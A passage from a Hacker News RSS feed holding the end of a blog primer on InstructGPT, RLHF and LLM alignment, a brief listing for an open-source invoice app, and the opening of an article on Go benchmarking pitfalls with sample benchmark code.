</span><span><a href="https://arxiv.org/pdf/2112.09332.pdf" target="_blank" rel="noopener noreferrer">webGPT</a></span><span> showed that smaller LLMs could perform the same as larger models with efficient querying/ information retrieval].</span></span></p><p><span><span>[And some of these papers like Flash Attention and LoRA came chronologically after the papers discussed in the next few sections].</span></span></p><h2 id="block-a72fc0eed97f4d01940b386423b0ff5c"><span id="a72fc0eed97f4d01940b386423b0ff5c"></span><span><span>InstructGPT ü§ñ</span></span></h2><p><span><span>Yet, a major breakthrough in our understanding of LLM behavior was made with the release of </span><span><a href="https://arxiv.org/abs/2203.02155" target="_blank" rel="noopener noreferrer">the instructGPT paper</a></span><span>. </span></span></p><p><span><span>GPT-3 (particularly the large parameter kind) already demonstrated the ability to follow natural language instructions (i.e. ‚Äúprompts‚Äù), although these instructions typically needed to be </span><span><em>carefully worded </em></span><span>to get a desired output. </span></span></p><p><span><span>Yet, the output tended to be regurgitated language found deep in the dark corners of the Internet: </span><span><em>unfiltered</em></span><span>, likely </span><span><em>offensive</em></span><span>, </span><span><em>untruthful</em></span><span> and most probably </span><span><em>not</em></span><span> the response the user wanted. If the response wasn‚Äôt regurgitated, it could even be entirely made up (what are typically referred to as ‚Äú</span><span><strong>hallucinations</strong></span><span>‚Äù). </span></span></p><p><span><span>That is to say, the LLMs‚Äô capacity to follow natural language instructions could be quite </span><span><em>underwhelming</em></span><span>. </span></span></p><div id="block-b630ee614965424e992bdf837e20f0b4"><p><span><span></span><img alt="GPT-3 v. InstructGPT in response to a prompt. From OpenAI‚Äôs " sizes="100vw" srcset="https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2Fd18b685a-7738-4f28-87ea-e084dd49b259%2FScreenshot_2023-06-19_at_10.29.13_PM.png&amp;w=640&amp;q=80 640w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2Fd18b685a-7738-4f28-87ea-e084dd49b259%2FScreenshot_2023-06-19_at_10.29.13_PM.png&amp;w=750&amp;q=80 750w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2Fd18b685a-7738-4f28-87ea-e084dd49b259%2FScreenshot_2023-06-19_at_10.29.13_PM.png&amp;w=828&amp;q=80 828w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2Fd18b685a-7738-4f28-87ea-e084dd49b259%2FScreenshot_2023-06-19_at_10.29.13_PM.png&amp;w=1080&amp;q=80 1080w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2Fd18b685a-7738-4f28-87ea-e084dd49b259%2FScreenshot_2023-06-19_at_10.29.13_PM.png&amp;w=1200&amp;q=80 1200w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2Fd18b685a-7738-4f28-87ea-e084dd49b259%2FScreenshot_2023-06-19_at_10.29.13_PM.png&amp;w=1920&amp;q=80 1920w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2Fd18b685a-7738-4f28-87ea-e084dd49b259%2FScreenshot_2023-06-19_at_10.29.13_PM.png&amp;w=2048&amp;q=80 2048w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2Fd18b685a-7738-4f28-87ea-e084dd49b259%2FScreenshot_2023-06-19_at_10.29.13_PM.png&amp;w=3840&amp;q=80 3840w" src="https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2Fd18b685a-7738-4f28-87ea-e084dd49b259%2FScreenshot_2023-06-19_at_10.29.13_PM.png&amp;w=3840&amp;q=80" decoding="async" data-nimg="responsive" loading="lazy" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></p><figcaption><span><span>GPT-3 v. InstructGPT in response to a prompt. From OpenAI‚Äôs </span><span><a href="https://openai.com/research/instruction-following" target="_blank" rel="noopener noreferrer">blog post</a></span><span>.</span></span></figcaption></div><h2 id="block-c32b3388754146de815fc07ed8fbc2e1"><span id="c32b3388754146de815fc07ed8fbc2e1"></span><span><span>Steerability ‚õ∑Ô∏è &amp; Alignment üßòüèΩ‚Äç‚ôÄÔ∏è</span></span></h2><p><span><span>Training LLMs to predict the next token in a sentence has been surprisingly effective in teaching them to learn a generalizable representation of language. Train for this task over a large corpus (like the entire Internet), maybe add some other prediction tasks into the mix (translation, classification, etc - i.e. ‚Äú</span><span><em>mixture of objectives</em></span><span>‚Äù), and voila, you have yourself an LLM that, if large enough, can be easily taught to do other specific things with only a handful of examples (i.e. few-shot learners).</span></span></p><p><span><span>Yet, this training objective does not seem to translate into LLMs following ‚Äú</span><span><strong>user intent</strong></span><span>‚Äù.</span></span></p><p><span><span>LLMs might be able to answer multiple choice questions well or be fine-tuned to do some specific task; but left to their own devices, they aren‚Äôt shown to be particularly good at following user instructions </span><span><em>without significant guardrails </em></span><span>(particularly in a zero-shot setting). </span></span></p><p><span><span>In fact, many a time they tend to regurgitate an answer that they‚Äôve seen before, or ignore the instructions entirely and ramble, or give a confident sounding answer that was non-sense (i.e. hallucinations). This is the problem that the ML research community calls </span><span><strong>steerability</strong></span><span> - the ability to prompt an LLM to provide a desired result.</span></span></p><div id="block-c9c12af17d3149b58733da9f171b8844"><p><span><span>Compound this with the desire that an LLM output </span><span><strong>embody a set of values</strong></span><span> (e.g. lack racism or homophobia, or say</span><span><strong> </strong></span><span><strong><a href="https://arxiv.org/pdf/2204.05862.pdf" target="_blank" rel="noopener noreferrer">Anthropic‚Äôs HHH</a></strong></span><span>) or quality of output expected by the user and we begin to appreciate the surface of </span><span><a href="https://ai-alignment.com/?gi=903be471f45d" target="_blank" rel="noopener noreferrer"><strong>the alignment problem</strong></a></span><span>. What </span><span><a href="https://openai.com/blog/democratic-inputs-to-ai" target="_blank" rel="noopener noreferrer">values an LLM is aligned to</a></span><span>, how to evaluate for alignment, and whether </span><span><a href="https://openai.com/blog/our-approach-to-alignment-research" target="_blank" rel="noopener noreferrer">we can align systems more intelligent than ourselves</a></span><span> are all interesting open research threads.</span></span></p></div><p><span><span>Within the instructGPT paper, the authors developed a 2 part solution to trying to tackle this problem: </span></span></p><ol type="1"><li id="block-17622ca1f78c452fb85c8e3f4261c19a"><span><span>Supervised (Instruction) Fine-tuning  (SFT)</span></span></li><li id="block-310b159822f34ce59119be1db49ca2b5"><span><span>Reinforcement Learning via Human Feedback (RLHF)</span></span></li></ol><p><span><span>Using these 2 sequential training tasks, the authors are able to convert a GPT-3 into what they call </span><span><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>InstructGPT</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></span><span>. </span></span></p><p><span><span>The InstructGPT paper‚Äôs results showed that simply creating larger models was an </span><span><em>insufficient condition</em></span><span> for developing a steerable and aligned model:</span><span><strong> in fact, the 175B GPT-3 ‚Äúprompted‚Äù model performed worse on average than the 1.3B parameter InstructGPT</strong></span><span>.</span></span></p><div id="block-fe0d3856caf04645b909099586af9e38"><p><span><span></span><img alt="Comparison of human assessments of the outputs of GPT-3, GPT-3-prompted, ‚ÄúSFT‚Äù, and InstructGPT (‚ÄùSFT‚Äù+‚ÄùRLHF‚Äù). Again from the OpenAI " sizes="100vw" srcset="https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F54317062-ef3b-482b-bf45-636d0c1e6d79%2FScreenshot_2023-07-23_at_2.33.16_PM.png&amp;w=640&amp;q=80 640w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F54317062-ef3b-482b-bf45-636d0c1e6d79%2FScreenshot_2023-07-23_at_2.33.16_PM.png&amp;w=750&amp;q=80 750w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F54317062-ef3b-482b-bf45-636d0c1e6d79%2FScreenshot_2023-07-23_at_2.33.16_PM.png&amp;w=828&amp;q=80 828w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F54317062-ef3b-482b-bf45-636d0c1e6d79%2FScreenshot_2023-07-23_at_2.33.16_PM.png&amp;w=1080&amp;q=80 1080w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F54317062-ef3b-482b-bf45-636d0c1e6d79%2FScreenshot_2023-07-23_at_2.33.16_PM.png&amp;w=1200&amp;q=80 1200w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F54317062-ef3b-482b-bf45-636d0c1e6d79%2FScreenshot_2023-07-23_at_2.33.16_PM.png&amp;w=1920&amp;q=80 1920w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F54317062-ef3b-482b-bf45-636d0c1e6d79%2FScreenshot_2023-07-23_at_2.33.16_PM.png&amp;w=2048&amp;q=80 2048w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F54317062-ef3b-482b-bf45-636d0c1e6d79%2FScreenshot_2023-07-23_at_2.33.16_PM.png&amp;w=3840&amp;q=80 3840w" src="https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F54317062-ef3b-482b-bf45-636d0c1e6d79%2FScreenshot_2023-07-23_at_2.33.16_PM.png&amp;w=3840&amp;q=80" decoding="async" data-nimg="responsive" loading="lazy" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></p><figcaption><span><span>Comparison of human assessments of the outputs of GPT-3, GPT-3-prompted, ‚ÄúSFT‚Äù, and InstructGPT (‚ÄùSFT‚Äù+‚ÄùRLHF‚Äù). Again from the OpenAI </span><span><a href="https://openai.com/research/instruction-following" target="_blank" rel="noopener noreferrer">blog post</a></span><span>. Using humans to ascertain the quality of a generative model‚Äôs output makes more sense than using a traditional set of benchmarks that need quantitative answers. Both the training and test labelers (completely different set of people - OpenAI did an incredible job designing an experimental design that minimizes label leakage and overfitting to one‚Äôs preferences) were selected using a rigorous evaluation criteria to make sure they were ‚Äúaligned‚Äù with OpenAI‚Äôs values they want to align their LLM to. These Likert scale measurements capture the steerability and alignment quality of these model outputs.</span></span></figcaption></div><p><span><span>That is to say,</span><span><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong> h</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></span><span><em><strong>ow</strong></em></span><span> you trained your LLM can be </span><span><strong>equally as important</strong></span><span> a knob as </span><span><strong>model size</strong></span><span>.</span></span></p><p><span><span>And while you might not have heard of InstructGPT, this paper‚Äôs recipe was the basis for  </span><span><strong><a href="https://chat.openai.com/auth/login" target="_blank" rel="noopener noreferrer">chatGPT</a></strong></span><span><strong> </strong></span><span>as well as a plethora of open source models that one can find on HuggingFace (check out the </span><span><a href="https://huggingface.co/spaces/HuggingFaceH4/open_llm_leaderboard" target="_blank" rel="noopener noreferrer">ever changing ü§ó&nbsp;LLM Leaderboard</a></span><span>).</span></span></p><div id="block-92988009e1b140a3a04e3273bb41fcac"><p><span><span></span><img alt="What is a blog post without a meme?" srcset="https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F07ac2735-c209-4ef0-b888-61dd7000cf60%2FScreenshot_2023-07-23_at_2.44.14_PM.png&amp;w=640&amp;q=80 1x, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F07ac2735-c209-4ef0-b888-61dd7000cf60%2FScreenshot_2023-07-23_at_2.44.14_PM.png&amp;w=1080&amp;q=80 2x" src="https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F07ac2735-c209-4ef0-b888-61dd7000cf60%2FScreenshot_2023-07-23_at_2.44.14_PM.png&amp;w=1080&amp;q=80" decoding="async" data-nimg="intrinsic" loading="lazy" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></p><figcaption><span><span>What is a blog post without a meme?</span></span></figcaption></div><h2 id="block-63e48dd8cd8a4d46be4029ff8a031e47"><span id="63e48dd8cd8a4d46be4029ff8a031e47"></span><span><span>1. Instruction Fine-Tuning  üéõÔ∏è</span></span></h2><p><span><span>The first step to improving the output of a generative model logically seems to be teach it to follow instructions better. </span></span></p><p><span><span>To that end, the authors culminated a series of prompts via submissions to their playground API from real users (i.e. tackle the cold-start problem) as well as a mixture of prompting tasks of their own devise. Using a rigorous selection process,  labelers were hired to produce high-quality outputs that were aligned with </span><span><u>Anthropic‚Äôs 3 Laws</u></span><span>: helpful, honest and harmless</span><span><strong> (HHH</strong></span><span>, or maybe </span><span><a href="https://en.wikipedia.org/wiki/Triple_H" target="_blank" rel="noopener noreferrer">Triple H</a></span><span>?</span><span><strong>). </strong></span></span></p><p><span><span>Using these gold-standard labels, they fine-tuned a GPT model to learn these outputs. This is what they call ‚Äú</span><span><strong>Supervised Fine-tuning</strong></span><span>‚Äù (SFT).</span></span></p><h2 id="block-44942fd81c604e8fa5b14272b008ba0b"><span id="44942fd81c604e8fa5b14272b008ba0b"></span><span><span>2. RLHF üíé</span></span></h2><p><span><span>Now what about teaching an LLM to produce outputs that embody a set of values?</span></span></p><p><span><span>While the public perception of OpenAI is predominantly tied to GPT* models, a non-trivial percentage of their efforts has been focused on attacking </span><span><a href="https://openai.com/blog/our-approach-to-alignment-research" target="_blank" rel="noopener noreferrer">the alignment problem</a></span><span>. Their solution to this problem, thus far, has been what they call </span><span><strong>Reinforcement Learning via Human Feedback  (RLHF) </strong></span><span>(note: this is expected to not work in the case of </span><span><a href="https://openai.com/blog/introducing-superalignment" target="_blank" rel="noopener noreferrer">superalignment</a></span><span>, or teaching systems smarter than ourselves our values). </span></span></p><p><span><span>Teaching an LLM a set of human values is a challenging modeling task. Traditional loss functions usually measure the model‚Äôs internal belief about the probability the data belongs to the correct label (i.e. cross entropy). But human values are more complex; they are hard to encapsulate within a single label . Rather than </span><span><em>explicitly</em></span><span> labeling data, it might be easier for a human to read two or more LLM outputs and encode their preferences through </span><span><em>comparison</em></span><span>. An AI system can then </span><span><strong>implicitly</strong></span><span> learn these preferences by learning to correctly rank a set of options. </span></span></p><p><span><span>Along these lines, RLHF seeks to teach an AI system a set of preferences by learning a </span><span><strong>reward function/model </strong></span><span>through interacting with a human and gaining their input. </span></span></p><p><span><span>This reward model is then used to </span><span><strong>guide the LLM</strong></span><span> to produce higher-valued outputs through </span><span><strong>reinforcement learning. </strong></span><span> At each step, the reward model takes an input and output and returns a ‚Äúpreferability‚Äù number; the LLM seeks to narrow the difference between the ‚Äúoptimal‚Äù preference and it‚Äôs current output over many interactions. This is used to train the LLM to produce a set of outputs that are ‚Äúaligned‚Äù with the values of the labelers/modelers/etc (for a decent primer on RLHF, check out HuggingFace‚Äôs blog </span><span><a href="https://huggingface.co/blog/rlhf" target="_blank" rel="noopener noreferrer">post</a></span><span>).</span></span></p><div id="block-fa3ffdbc02a343628c2a55f38013926e"><p><span><span></span><img alt="Labeler output rankings. Figure 12 in the appendix of the " sizes="100vw" srcset="https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2Fa6d60548-2dc3-4165-bf28-d1e7da1702ed%2FScreenshot_2023-07-23_at_3.35.43_PM.png&amp;w=640&amp;q=80 640w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2Fa6d60548-2dc3-4165-bf28-d1e7da1702ed%2FScreenshot_2023-07-23_at_3.35.43_PM.png&amp;w=750&amp;q=80 750w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2Fa6d60548-2dc3-4165-bf28-d1e7da1702ed%2FScreenshot_2023-07-23_at_3.35.43_PM.png&amp;w=828&amp;q=80 828w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2Fa6d60548-2dc3-4165-bf28-d1e7da1702ed%2FScreenshot_2023-07-23_at_3.35.43_PM.png&amp;w=1080&amp;q=80 1080w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2Fa6d60548-2dc3-4165-bf28-d1e7da1702ed%2FScreenshot_2023-07-23_at_3.35.43_PM.png&amp;w=1200&amp;q=80 1200w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2Fa6d60548-2dc3-4165-bf28-d1e7da1702ed%2FScreenshot_2023-07-23_at_3.35.43_PM.png&amp;w=1920&amp;q=80 1920w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2Fa6d60548-2dc3-4165-bf28-d1e7da1702ed%2FScreenshot_2023-07-23_at_3.35.43_PM.png&amp;w=2048&amp;q=80 2048w, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2Fa6d60548-2dc3-4165-bf28-d1e7da1702ed%2FScreenshot_2023-07-23_at_3.35.43_PM.png&amp;w=3840&amp;q=80 3840w" src="https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2Fa6d60548-2dc3-4165-bf28-d1e7da1702ed%2FScreenshot_2023-07-23_at_3.35.43_PM.png&amp;w=3840&amp;q=80" decoding="async" data-nimg="responsive" loading="lazy" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></p><figcaption><span><span>Labeler output rankings. Figure 12 in the appendix of the </span><span><a href="https://arxiv.org/pdf/2203.02155.pdf" target="_blank" rel="noopener noreferrer">paper</a></span><span>. The labeler selection process and metrics are worth diving into.</span></span></figcaption></div><p><span><span>Among the theoretical benefits of using reinforcement learning to teach an LLM human preferences is </span><span><strong>the potential for reducing an LLM‚Äôs tendency towards regurgitation</strong></span><span> (as John Schulman and others have emphasized recently in lectures). Rather than overfitting/blindly learning a specific label distribution, RLHF is using rewards/penalties to guide the LLM outputs towards a more optimal answer through incentives without explicitly seeing a label (as in next token prediction).</span></span></p><p><span><span>InstructGPT was shown to produce outputs that were less toxic, more truthful, and more steerable.  In fact, this paper was a major catalyst&nbsp;in the </span><span><em>outpouring</em></span><span> of new innovations using LLMs. </span></span></p><h2 id="block-e66065b5c05343109388237954ef3311"><span id="e66065b5c05343109388237954ef3311"></span><span><span>Conclusion: LLMs as Reasoning Agents ü§î</span></span></h2><p><span><span>An emergent property of LLMs that we have gleamed in the wake of the InstructGPT paper is their capacity as </span><span><strong>reasoning agents</strong></span><span>. </span></span></p><div id="block-796a00d399c9419d83d6779999b13cc4"><p><span><span></span><img alt="An observation by Jan Leike about instructGPT." srcset="https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F8b9b7f9d-c0d5-4dc3-9ce6-7967efaaeb7b%2FScreenshot_2023-07-24_at_12.04.04_AM.png&amp;w=640&amp;q=80 1x, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F8b9b7f9d-c0d5-4dc3-9ce6-7967efaaeb7b%2FScreenshot_2023-07-24_at_12.04.04_AM.png&amp;w=1080&amp;q=80 2x" src="https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F8b9b7f9d-c0d5-4dc3-9ce6-7967efaaeb7b%2FScreenshot_2023-07-24_at_12.04.04_AM.png&amp;w=1080&amp;q=80" decoding="async" data-nimg="intrinsic" loading="lazy" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></p><figcaption><span><span>An observation by Jan Leike about instructGPT.</span></span></figcaption></div><p><span><span>Given a set of instructions, an instruction fine-tuned/aligned LLM is able (conditional on size and training quality) to</span><span><strong> reason through a set of steps</strong></span><span> to produce a desired output. This has lead to a flurry of research into different prompt writing techniques: </span><span><strong>self-ask</strong></span><span>, </span><span><strong>chain-of-thought,</strong></span><span> etc. are all different parlor tricks designed to guide an LLM towards deducing the right answer. This set of techniques is what the ML community calls </span><span><a href="https://lilianweng.github.io/posts/2023-03-15-prompt-engineering/" target="_blank" rel="noopener noreferrer"><strong>prompt engineering</strong></a></span><span>, which seems more an art form than a science these days. </span></span></p><div id="block-da7f0c9a17914c1b8b80cbe50aaafda6"><p><span><span></span><img alt="Great " srcset="https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F74512b9a-a50c-47c4-95b0-76ac8d0a9d77%2FScreenshot_2023-07-15_at_6.00.49_PM.png&amp;w=640&amp;q=80 1x, https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F74512b9a-a50c-47c4-95b0-76ac8d0a9d77%2FScreenshot_2023-07-15_at_6.00.49_PM.png&amp;w=1080&amp;q=80 2x" src="https://willthompson.name/_next/image?url=https%3A%2F%2Fassets.super.so%2Fd0376c53-81de-4b6c-b0fb-0a16f4ae9da5%2Fimages%2F74512b9a-a50c-47c4-95b0-76ac8d0a9d77%2FScreenshot_2023-07-15_at_6.00.49_PM.png&amp;w=1080&amp;q=80" decoding="async" data-nimg="intrinsic" loading="lazy" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></span></p><figcaption><span><span>Great </span><span><a href="https://twitter.com/karpathy/status/1617979122625712128?s=20" target="_blank" rel="noopener noreferrer">tweet</a></span><span> from Karpathy on prompting. Read the sub-tweets citing some interesting papers. </span></span></figcaption></div><p><span><span>As LLMs improve over time, it is possible that researchers/practitioners will not need to lean on these techniques as much, despite sensational claims in the media that you can make </span><span><a href="https://www.forbes.com/sites/jodiecook/2023/07/12/ai-prompt-engineers-earn-300k-salaries-heres-how-to-learn-the-skill-for-free/?sh=78287b69d4a1" target="_blank" rel="noopener noreferrer">$300k being a  prompt engineer</a></span><span>.</span></span></p><p><span><span>Along with research into prompt engineering, LLM-centric tech stacks (what many refer to as </span><span><strong><a href="https://lilianweng.github.io/posts/2023-06-23-agent/" target="_blank" rel="noopener noreferrer">autonomous agents</a></strong></span><span>) is an area of enthusiasm. These </span><span><strong>agents</strong></span><span> utilize LLMs as problem solvers; provision them with a set of tools at their disposal and these models can solve a surprising number of tasks. </span></span></p><p><span><span>Much of the open source efforts are focused on developing these tools- it‚Äôs an exciting time to see what possibilities LLMs will further unlock üòé.</span></span></p><h2 id="block-f1502945b85a48f684e5d7f6d842f07c"><span id="f1502945b85a48f684e5d7f6d842f07c"></span><span><span>Citation</span></span></h2><!--$--><div id="block-3bebe81e0adf4cdc9d013c38c04a4447"><pre><code>@article{
  title   = "What We Know About LLMs (Primer)",
  author  = "Thompson, Will",
  journal = "https://willthompson.name",
  year    = "2023",
  month   = "July",
  day   = "23",
  url     = "https://willthompson.name/what-we-know-about-llms-primer"
}</code></pre><figcaption><span></span></figcaption></div><!--/$--></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Invoice Dragon ‚Äì An open source app to create PDF invoices (441 pts)]]></title>
            <link>https://invoicedragon.com/</link>
            <guid>36860898</guid>
            <pubDate>Tue, 25 Jul 2023 11:45:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://invoicedragon.com/">https://invoicedragon.com/</a>, See on <a href="https://news.ycombinator.com/item?id=36860898">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="__next"><main><main><div><svg xmlns="http://www.w3.org/2000/svg" width="168" height="155" fill="#ffffff" viewBox="0 0 256 256"><path d="M216,40H40A16,16,0,0,0,24,56V208a8,8,0,0,0,11.58,7.15L64,200.94l28.42,14.21a8,8,0,0,0,7.16,0L128,200.94l28.42,14.21a8,8,0,0,0,7.16,0L192,200.94l28.42,14.21A8,8,0,0,0,232,208V56A16,16,0,0,0,216,40ZM176,144H80a8,8,0,0,1,0-16h96a8,8,0,0,1,0,16Zm0-32H80a8,8,0,0,1,0-16h96a8,8,0,0,1,0,16Z"></path></svg><h2>A fast and convenient solution for effortlessly creating Invoices and Receipts.<br>Absolutely Free !</h2></div></main></main></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Common Pitfalls in Go Benchmarking (1203 pts)]]></title>
            <link>https://eli.thegreenplace.net/2023/common-pitfalls-in-go-benchmarking/</link>
            <guid>36860065</guid>
            <pubDate>Tue, 25 Jul 2023 09:51:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://eli.thegreenplace.net/2023/common-pitfalls-in-go-benchmarking/">https://eli.thegreenplace.net/2023/common-pitfalls-in-go-benchmarking/</a>, See on <a href="https://news.ycombinator.com/item?id=36860065">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                
                <p>Go programmers have the good fortune of excellent testing and benchmarking
tooling built into the standard library - in the <tt>testing</tt> package. However,
<em>benchmarking is hard</em>. This isn't Go specific; it's just one of those things
experienced developers learn over time.</p>
<p>This post lists some common benchmarking pitfalls Go programmers run into. It
assumes basic familiarity with writing Go benchmarks; consult the <a href="https://pkg.go.dev/testing">testing
package documentation</a> if needed. While these
pitfalls are presented in Go, they exist in any programming language or
environment, so the lessons learned here are widely applicable.</p>
<div id="benchmarking-the-wrong-thing">
<h2>Benchmarking the wrong thing</h2>
<p>Let's say we want to benchmark the new sorting functionality available in the
<tt>slices</tt> package starting with Go 1.21 <a href="#footnote-1" id="footnote-reference-1">[1]</a>. Consider the following
benchmark:</p>
<div><pre><span></span><span>const</span><span> </span><span>N</span><span> </span><span>=</span><span> </span><span>100</span><span>_000</span><span></span>

<span>func</span><span> </span><span>BenchmarkSortIntsWrong</span><span>(</span><span>b</span><span> </span><span>*</span><span>testing</span><span>.</span><span>B</span><span>)</span><span> </span><span>{</span><span></span>
<span>  </span><span>ints</span><span> </span><span>:=</span><span> </span><span>makeRandomInts</span><span>(</span><span>N</span><span>)</span><span></span>
<span>  </span><span>b</span><span>.</span><span>ResetTimer</span><span>()</span><span></span>

<span>  </span><span>for</span><span> </span><span>i</span><span> </span><span>:=</span><span> </span><span>0</span><span>;</span><span> </span><span>i</span><span> </span><span>&lt;</span><span> </span><span>b</span><span>.</span><span>N</span><span>;</span><span> </span><span>i</span><span>++</span><span> </span><span>{</span><span></span>
<span>    </span><span>slices</span><span>.</span><span>Sort</span><span>(</span><span>ints</span><span>)</span><span></span>
<span>  </span><span>}</span><span></span>
<span>}</span><span></span>

<span>func</span><span> </span><span>makeRandomInts</span><span>(</span><span>n</span><span> </span><span>int</span><span>)</span><span> </span><span>[]</span><span>int</span><span> </span><span>{</span><span></span>
<span>  </span><span>ints</span><span> </span><span>:=</span><span> </span><span>make</span><span>([]</span><span>int</span><span>,</span><span> </span><span>n</span><span>)</span><span></span>
<span>  </span><span>for</span><span> </span><span>i</span><span> </span><span>:=</span><span> </span><span>0</span><span>;</span><span> </span><span>i</span><span> </span><span>&lt;</span><span> </span><span>n</span><span>;</span><span> </span><span>i</span><span>++</span><span> </span><span>{</span><span></span>
<span>    </span><span>ints</span><span>[</span><span>i</span><span>]</span><span> </span><span>=</span><span> </span><span>rand</span><span>.</span><span>Intn</span><span>(</span><span>n</span><span>)</span><span></span>
<span>  </span><span>}</span><span></span>
<span>  </span><span>return</span><span> </span><span>ints</span><span></span>
<span>}</span><span></span>
</pre></div>
<p>Why is this benchmark wrong? Because it's not really testing what you think it's
testing. <tt>slices.Sort</tt> sorts a slice <em>in-place</em>. After the first iteration,
